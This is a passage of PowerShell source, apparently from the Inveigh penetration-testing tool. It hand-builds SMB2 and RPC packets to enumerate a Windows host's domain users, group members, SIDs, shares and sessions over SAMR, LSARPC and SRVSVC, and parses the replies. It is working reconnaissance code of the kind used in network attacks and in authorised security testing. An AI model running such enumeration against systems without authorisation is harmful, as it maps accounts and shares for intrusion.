                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x40,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'CreateRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2CreateRequestFile $named_pipe
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive'
                    }

                    'EnumDomainUsers'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMREnumDomainUsers $SAMR_domain_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x0d,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'GetMembersInAlias'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRGetMembersInAlias $SAMR_policy_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0d,0x00,0x00,0x00 0x00,0x00 0x21,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'Logoff'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2SessionLogoffRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive' 
                    }

                    'LookupNames'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRLookupNames $SAMR_domain_handle $Group
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x11,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'LookupRids'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRLookupRids $SAMR_domain_handle $RID_count_bytes $RID_list
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0b,0x00,0x00,0x00 0x00,0x00 0x12,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'LSAClose'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSAClose $policy_handle
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $stage = 'SendReceive'
                        $step++
                    }

                    'LSALookupSids'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSALookupSids $policy_handle $SID_array
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data   
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $stage = 'SendReceive'
                    }

                    'LSAOpenPolicy'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSAOpenPolicy
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x06,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $stage = 'SendReceive'
                    }

                    'LSAQueryInfoPolicy'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSAQueryInfoPolicy $policy_handle
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data   
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $stage = 'SendReceive' 
                    }

                    'NetSessEnum'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SRVSVC_data = New-PacketSRVSVCNetSessEnum $Target
                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SRVSVC_data.Length 1024
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00                        
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SRVSVC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                        $stage = 'SendReceive'
                    }
                    
                    'NetShareEnumAll'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SRVSVC_data = New-PacketSRVSVCNetShareEnumAll $Target
                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SRVSVC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SRVSVC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                        $stage = 'SendReceive'
                    }

                    'OpenAlias'
                    {  
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMROpenAlias $SAMR_domain_handle $SAMR_RID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0c,0x00,0x00,0x00 0x00,0x00 0x1b,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'OpenDomain'
                    {    
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMROpenDomain $SAMR_connect_handle $SID_count $LSA_domain_SID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x07,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'OpenGroup'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMROpenGroup $SAMR_domain_handle $SAMR_RID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive' 
                    }

                    'ParseLookupRids'
                    {
                        [Byte[]]$response_user_count_bytes = $client_receive[140..143]
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 8 + 164
                        $response_user_end = $response_user_start
                        $response_user_length_start = 152
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            $response_user_object = New-Object PSObject
                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            $response_user_length_start = $response_user_length_start + 8
                            $i++
                        }
                        
                        $stage = 'CloseRequest'
                    }

                    'ParseLookupSids'
                    {
                        [Byte[]]$response_domain_count_bytes = $client_receive[144..147]
                        $response_domain_count = [System.BitConverter]::ToInt16($response_domain_count_bytes,0)
                        $response_domain_start = $response_domain_count * 12 + 172
                        $response_domain_end = $response_domain_start
                        $response_domain_length_start = 160
                        $enumerate_group_user_list = New-Object System.Collections.ArrayList
                        $enumerate_group_group_list = New-Object System.Collections.ArrayList
                        $response_domain_list = @()
                        $i = 0

                        while($i -lt $response_domain_count)
                        {
                            [Byte[]]$response_domain_length_bytes = $client_receive[$response_domain_length_start..($response_domain_length_start + 1)]
                            $response_domain_length = [System.BitConverter]::ToInt16($response_domain_length_bytes,0)
                            $response_domain_end = $response_domain_start + $response_domain_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_domain_start - 4)..($response_domain_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_domain_bytes = $client_receive[$response_domain_start..($response_domain_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_domain_start += $response_domain_length + 42
                            }
                            else
                            {
                                $response_domain_start += $response_domain_length + 40
                            }

                            $response_domain = [System.BitConverter]::ToString($response_domain_bytes)
                            $response_domain = $response_domain -replace "-00",""
                            $response_domain = $response_domain.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_domain = New-Object System.String ($response_domain,0,$response_domain.Length)
                            $response_domain_list += $response_domain
                            $response_domain_length_start = $response_domain_length_start + 12
                            $i++
                        }

                        [Byte[]]$response_user_count_bytes = $client_receive[($response_domain_start - 4)..($response_domain_start - 1)]         
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 16 + $response_domain_start + 12
                        $response_user_end = $response_user_start
                        $response_user_length_start = $response_domain_start + 4
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            [Byte[]]$response_user_type_bytes = $client_receive[($response_user_length_start - 4)]
                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            $response_SID_index_start = $response_user_length_start + 8
                            [Byte[]]$response_SID_index_bytes = $client_receive[$response_SID_index_start..($response_SID_index_start + 3)]
                            $response_SID_index = [System.BitConverter]::ToInt16($response_SID_index_bytes,0)
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]

                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            $response_user_length_start = $response_user_length_start + 16
                            $response_administrator = $response_domain_list[$response_SID_index] + "\" + $response_user

                            if($response_user_type_bytes -eq 1)
                            {
                                $enumerate_group_user_list.Add($response_administrator) > $null
                            }
                            else
                            {
                                $enumerate_group_group_list.Add($response_administrator) > $null
                            }
                            
                            $i++
                        }

                        if($enumerate_group_user_list -gt 0)
                        {
                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $target $EnumerateGroup group member users:") > $null
                            $inveigh.output_queue.Add($enumerate_group_user_list -join ",") > $null
                        }

                        if($enumerate_group_group_list -gt 0)
                        {
                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $target $EnumerateGroup group member groups:") > $null
                            $inveigh.output_queue.Add($enumerate_group_group_list -join ",") > $null
                        }

                        $stage = 'CloseRequest'
                    }

                    'ParseSRVSVC'
                    {
                        $response_object_list = @()
                        $share_list = @()
                        [Byte[]]$response_count_bytes = $client_receive[152..155]
                        $response_count = [System.BitConverter]::ToInt32($response_count_bytes,0)
                        $response_item_index = 164

                        if($action_stage -eq 'Share')
                        {
                            $enumerate_share_list = New-Object System.Collections.ArrayList
                        }
                        else
                        {
                            $enumerate_netsession_list = New-Object System.Collections.ArrayList
                        }
                        
                        $i = 0

                        while($i -lt $response_count)
                        {

                            if($i -gt 0)
                            {

                                if($response_item_length % 2)
                                {
                                    $response_item_index += $response_item_length * 2 + 2
                                }
                                else
                                {
                                    $response_item_index += $response_item_length * 2
                                }

                            }
                            else
                            {
                                
                                if($action_stage -eq 'Share')
                                {
                                    $response_item_index += $response_count * 12
                                }
                                else
                                {
                                    $response_item_index += $response_count * 16
                                }

                            }

                            [Byte[]]$response_item_length_bytes = $client_receive[$response_item_index..($response_item_index + 3)]
                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)
                            $response_item_index += 12
                            [Byte[]]$response_item_bytes = $client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]
                            $response_item = [System.BitConverter]::ToString($response_item_bytes)
                            $response_item = $response_item -replace "-00",""
                            $response_item = $response_item.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_item = New-Object System.String ($response_item,0,$response_item.Length)
                            
                            if($response_item_length % 2)
                            {
                                $response_item_index += $response_item_length * 2 + 2
                            }
                            else
                            {
                                $response_item_index += $response_item_length * 2
                            }
                            
                            [Byte[]]$response_item_length_bytes = $client_receive[$response_item_index..($response_item_index + 3)]
                            $response_item_length = [System.BitConverter]::ToInt32($response_item_length_bytes,0)
                            $response_item_index += 12
                            [Byte[]]$response_item_2_bytes = $client_receive[($response_item_index)..($response_item_index + ($response_item_length * 2 - 1))]
                            $response_item_2 = [System.BitConverter]::ToString($response_item_2_bytes)
                            $response_item_2 = $response_item_2 -replace "-00",""
                            $response_item_2 = $response_item_2.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_item_2 = New-Object System.String ($response_item_2,0,$response_item_2.Length)

                            if($action_stage -eq 'Share')
                            {

                                if($response_item -ne 'ADMIN$' -and $response_item -notmatch '^[a-zA-Z][\$]$' -and $response_item -ne 'IPC$' -and $response_item -ne 'print$')
                                {
                                    $enumerate_share_list.Add($response_item) > $null
                                }
                                
                            }
                            else
                            {

                                if($response_item -ne "\\" + $client.Client.LocalEndPoint.Address.IPAddressToString)
                                {
                                    $enumerate_netsession_list.Add($response_item + "\" + $response_item_2) > $null
                                }

                            }

                            $i++
                        }

                        if($enumerate_share_list.Count -gt 0 -and $action_stage -eq 'Share')
                        {
                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $target custom shares:") > $null
                            $inveigh.output_queue.Add($enumerate_share_list -join ",") > $null
                        }

                        if($enumerate_netsession_list.Count -gt 0 -and $action_stage -eq 'NetSession')
                        {
                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $target NetSessions:") > $null
                            $inveigh.output_queue.Add($enumerate_netsession_list -join ",") > $null
                        }

                        $stage = 'CloseRequest'
                    }

                    'ParseUsers'
                    {
                        [Byte[]]$response_user_count_bytes = $client_receive[148..151]
                        $response_user_count = [System.BitConverter]::ToInt16($response_user_count_bytes,0)
                        $response_user_start = $response_user_count * 12 + 172
                        $response_user_end = $response_user_start
                        $response_RID_start = 160
                        $response_user_length_start = 164
                        $enumerate_user_list = New-Object System.Collections.ArrayList
                        $i = 0

                        while($i -lt $response_user_count)
                        {
                            $response_user_object = New-Object PSObject
                            [Byte[]]$response_user_length_bytes = $client_receive[$response_user_length_start..($response_user_length_start + 1)]
                            $response_user_length = [System.BitConverter]::ToInt16($response_user_length_bytes,0)
                            [Byte[]]$response_RID_bytes = $client_receive[$response_RID_start..($response_RID_start + 3)]
                            $response_user_end = $response_user_start + $response_user_length
                            [Byte[]]$response_actual_count_bytes = $client_receive[($response_user_start - 4)..($response_user_start - 1)]
                            $response_actual_count = [System.BitConverter]::ToInt16($response_actual_count_bytes,0)
                            [Byte[]]$response_user_bytes = $client_receive[$response_user_start..($response_user_end - 1)]
                            
                            if($response_actual_count % 2)
                            {
                                $response_user_start += $response_user_length + 14
                            }
                            else
                            {
                                $response_user_start += $response_user_length + 12
                            }

                            $response_user = [System.BitConverter]::ToString($response_user_bytes)
                            $response_user = $response_user -replace "-00",""
                            $response_user = $response_user.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $response_user = New-Object System.String ($response_user,0,$response_user.Length)
                            $response_user_length_start = $response_user_length_start + 12
                            $response_RID_start = $response_RID_start + 12
                            $i++

                            if($response_user -ne 'Guest')
                            {
                                $enumerate_user_list.Add($response_user) > $null
                            }

                        }

                        if($enumerate_user_list -gt 0)
                        {
                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $target local users:") > $null
                            $inveigh.output_queue.Add($enumerate_user_list -join ",") > $null
                        }

                        $stage = 'CloseRequest'
                    }
                
                    'QueryGroupMember'
                    {
                        $message_ID++
